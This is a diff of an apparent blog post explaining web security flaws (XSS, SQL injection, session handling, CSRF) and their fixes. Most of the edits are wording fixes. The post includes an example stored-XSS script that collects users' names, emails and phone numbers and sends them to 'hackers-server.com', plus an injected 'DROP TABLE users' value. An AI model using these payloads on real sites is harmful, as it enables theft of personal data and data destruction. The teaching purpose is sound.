@@ -5,7 +5,7 @@ author: mofor
 categories: [ web development, security ]
 image: assets/images/posts/2023-05-31-web-application-security/1.jpg
 featured: true
-rating: 4.5
+rating: 4
 beforetoc: "Are web applications nowadays really safe to use?"
 toc: true
 ---
@@ -45,11 +45,11 @@ So in this post, we’ll explore some essential aspects of web application secur
 
 Cross-Site Scripting (XSS) is a common vulnerability in web applications that allows attackers to inject malicious scripts into web pages viewed by other users. These scripts can be used to steal sensitive information, modify web content, or perform other malicious actions. You know how scripts bring some life to web applications? the same is true for its demise. At the core of XSS attacks, it functions by taking advantage of the fact that web applications execute scripts on user's browsers. As a result, any type of dynamically created script that is executed puts a web application at risk if the script being executed can be contaminated or modified in any way - in particular by an end user.
 
-In as much as there are categorical variations, Stored, Reflected and DOM-based XSS attacks encompass the types of XSS that most modern web applications need to look out for on a regular basis, and have been designated by committees like the Open Web Application Security Project (OWASP). as tje most common XSS attack vectors on the web. While this is not an in-depth tutorial, be sure to read on the various categories if interested.
+In as much as there are categorical variations; Stored, Reflected and DOM-based XSS attacks encompass the types of XSS that most modern web applications need to look out for on a regular basis, and have been designated by committees like the Open Web Application Security Project (OWASP), as the most common XSS attack vectors on the web. While this is not an in-depth tutorial, be sure to read on the various categories if interested.
 
 #### XSS Discovery and Exploitation
 
-Mimicking the Twitter Worm, suppose we have our social networking platform, where users can view profiles, make posts, and comments. Generally, commenting on our platform doesn't support text or markup formatting, but then you come across this awesome post of your crush, and want to leave a comment, but also you don't want to be casual like everyone else. So for the tech-savy person you are, you go ahead to comment this:
+Mimicking the Twitter Worm, suppose we have our social networking platform, where users can view profiles, make posts, and comments. Generally, commenting on our platform doesn't support text or markup formatting, but then you come across this awesome post of say a female model, and want to leave a comment, but also you don't want to be casual like everyone else. So for the tech-savvy person you are, you go ahead to comment this:
 
 ```html
 You truly are an epitome of <strong>beauty</strong>
@@ -88,49 +88,45 @@ const wrapper = document.querySelector('#commentArea');
 wrapper.appendChild(div);
 ```
 
-Because the text is appended literally to the DOM, it is interpreted as DOM markup
-rather than text. Our customer support request included a `<strong></strong>` tag in
-this case.
-In a more malicious case, we could have caused a lot of havoc using the same vulnerability. Script tags are the most popular way to take advantage of XSS vulnerabilities,
-but there are many ways to take advantage of such a bug.
+Because the text is appended literally to the DOM, it is interpreted as DOM markup rather than text. Our customer support request included a `<strong></strong>` tag in this case.
+In a more malicious case, we could have caused a lot of havoc using the same vulnerability. Script tags are the most popular way to take advantage of XSS vulnerabilities, but there are many ways to take advantage of such a bug.
 Consider if the comment had the following instead of just a tag to bold the
 text:
 
 ```html
 Loving the outfit.
 <script>
-/*
-* Get a list of all customers from the page.
-*/
-const customers = document.querySelectorAll('.user-comment');
-/*
-* Iterate through each DOM element containing the user-comment class,
-* collecting privileged personal identifier information (PII)
-* and store that data in the customerData array.
-*/
-const customerData = [];
-customers.forEach((customer) => {
-customerData.push({
-firstName: customer.querySelector('.firstName').innerText,
-lastName: customer.querySelector('.lastName').innerText,
-email: customer.querySelector('.email').innerText,
-phone: customer.querySelector('.phone').innerText
-});
-});
-/*
-* Build a new HTTP request, and exfiltrate the previously collected
-* data to the hacker's own servers.
-*/
-const http = new XMLHttpRequest();
-http.open('POST', 'https://hackers-server.com/data', true);
-http.setRequestHeader('Content-type', 'application/json');
-http.send(JSON.stringify(customerData);
+  /*
+  * Get a list of all customers from the page.
+  */
+  const customers = document.querySelectorAll('.user-comment');
+  /*
+  * Iterate through each DOM element containing the user-comment class,
+  * collecting privileged personal identifier information (PII)
+  * and store that data in the customerData array.
+  */
+  const customerData = [];
+
+  customers.forEach((customer) => {
+    customerData.push({
+    firstName: customer.querySelector('.firstName').innerText,
+    lastName: customer.querySelector('.lastName').innerText,
+    email: customer.querySelector('.email').innerText,
+    phone: customer.querySelector('.phone').innerText
+    });
+  });
+  /*
+  * Build a new HTTP request, and exfiltrate the previously collected
+  * data to the hacker's own servers.
+  */
+  const http = new XMLHttpRequest();
+  http.open('POST', 'https://hackers-server.com/data', true);
+  http.setRequestHeader('Content-type', 'application/json');
+  http.send(JSON.stringify(customerData);
 </script>
 ```
 
-This is a much more malicious use case. And it’s extremely dangerous for a number
-of reasons. The preceding code is what is known as a stored XSS attack — a variation of
-XSS that relies on the actual attack code being stored in the application owner’s data‐
+This is a much more malicious use case. And it’s extremely dangerous for a number of reasons. The preceding code is what is known as a stored XSS attack — a variation of XSS that relies on the actual attack code being stored in the application owner’s data‐
 bases. In our case, the comment we sent to is being stored on our platform's
 servers.
 When a script tag hits the DOM via JavaScript, the browser’s JavaScript interpreter is
@@ -142,7 +138,7 @@ access to. We find this data in the UI, convert it to a nice JSON for readabilit
 easy storage, and then send it back to our own servers for use or sale at a later time.
 The scariest thing about this is that because this code is inside of a script tag, it would
 not appear to the end user. The user would see the literal comment text, but the `<script></script>` tags and everything in between would
-not be visible to the rep, although it would be executing in the background. This is
+not be visible, although it would be executing in the background. This is
 because the browser will interpret the text as text. But the browser will see the
 script tag and interpret that as a script, just as it would if a legitimate developer wrote
 some inline script for a legitimate site.
@@ -231,7 +227,7 @@ Content-Security-Policy: script-src "self" https://whitelist.com.
 
 With such a CSP configuration, attempting to load a script from `https://hackers-server.com` would not be successful, and the browser would throw a CSP violation
 
-There are other ways to mitigate this vulnerability, but for the sake of simplicity, we'll have those.
+There are other ways to mitigate this vulnerability, but for the sake of simplicity, we'll have these.
 
 ### SQL Injection (SQLi)
 
@@ -244,14 +240,14 @@ Let’s consider another simple Node.js/Express.js server that communicates with
 ```javascript
 const sql = require('mssql');
 /*
-* Receive a GET request to /users, with a user_id param on the request body.
+* Receive a GET request from /users, with a user_id param.
 *
 * An SQL lookup will be performed, attempting to find a user in the database
 * with the `id` provided in the `user_id` param.
 *
 * The result of the database query is sent back in the response.
 */
-app.get('/users', function(req, res) {
+app.get('/users/:user_id', function(req, res) {
 const user_id = req.params.user_id;
 /*
 * Connect to the SQL database (server side).
@@ -270,8 +266,8 @@ return res.json(result);
 });
 ```
 
-In this example, a developer used direct string concatenation to attach the query
-param to the SQL query. This assumes the query param being sent over the network
+In this example, a developer used direct string concatenation to attach the route
+param to the SQL query. This assumes the route param being sent over the network
 has not been tampered with, which we know not to be a reliable metric for legitimacy.
 In the case of a valid `user_id`, this query will return a user object to the requester. In
 the case of a more malicious user_id string, many more objects could be returned
@@ -289,7 +285,7 @@ SELECT * FROM users where USER = true
 
 which translates into ***“give all user objects back to the requester.”***
 
-What if we just started a new statement inside of our user_id object?
+What if we just started a new statement inside of our user_id?
 
 ```javascript
 user_id = '123abc; DROP TABLE users;';
@@ -411,15 +407,15 @@ The average developer might ask, what's wrong with it? Well, let's find out.
 Insecure session management can occur when sessions do not have an expiration mechanism. Without session expiration, an attacker who gains access to a valid session can use it indefinitely.
 You might ask, how can the hacker gain access to my session? Well, while there's techniques on Session Hijacking, Fixation, Sidejacking and Replay, we will see how hackers make us of Cross Site Forgery Requests.
 
-For now, to avoid this, set an appropriate expiration time for sessions based on the application's requirements. In Express.js, you can specify the `cookie.maxAge` property within the session configuration to set the expiration time. Additionally, consider implementing an `"idle timeout"` where sessions expire after a certain period of inactivity.
+  For now, to avoid this, set an appropriate expiration time for sessions based on the application's requirements. In Express.js, you can specify the `cookie.maxAge` property within the session configuration to set the expiration time. Additionally, consider implementing an `"idle timeout"` where sessions expire after a certain period of inactivity.
 
 - **Insufficient Session ID Generation**: Insecure session management can occur if session IDs are easily guessable or predictable. If an attacker can predict or obtain a valid session ID, they can hijack user sessions.
 
-To mitigate this, ensure that session IDs are generated using a strong random number generator. In Express.js, you can provide a custom session ID generator using the `genid` option in the session configuration. It is recommended to use a library like `uuid` or `crypto` to generate secure session IDs.
+  To mitigate this, ensure that session IDs are generated using a strong random number generator. In Express.js, you can provide a custom session ID generator using the `genid` option in the session configuration. It is recommended to use a library like `uuid` or `crypto` to generate secure session IDs.
 
 - **Insecure Session Storage**: Insecure session management can occur if sensitive session data is stored in insecure locations or transmitted without encryption.
 
-To fix this, store sensitive session data on the server-side and avoid storing it in client-side storage. In Express.js, you can configure the session store to use a secure storage mechanism, such as a database store like MongoDB or Redis. Additionally, ensure that session data is transmitted over secure channels using HTTPS/TLS encryption.
+  To fix this, store sensitive session data on the server-side and avoid storing it in client-side storage. In Express.js, you can configure the session store to use a secure storage mechanism, such as a database store like MongoDB or Redis. Additionally, ensure that session data is transmitted over secure channels using HTTPS/TLS encryption.
 
 The list goes on and on, we see the developer leaving out crucial properties like:
 
@@ -520,6 +516,6 @@ In the above example, there is no CSRF protection implemented. The server accept
 Not leaving out CSP, and all other mentioned and unmentioned techniques.
 
 I hope you saw the vitality of security, and how little things we overlook can cause havoc.
-If you haven't experienced any vulnerability attacks yet, probably a hacker hasn't found that loophole. Keep counting your luck. Reach out to a Pentester and have him do his thing, you'll be in awe if you have been overlooking security.
+If you haven't experienced any vulnerability attacks yet, probably a hacker hasn't found that loophole. Keep counting your luck. Reach out to a Pentester and have them do their thing, you'll be in awe of the outcome if you have been overlooking security.
 
-Well, that's it guys, hope you had a good time.
+Well, that's it guys, hope you had a good time and will consider security measures when next you code!.
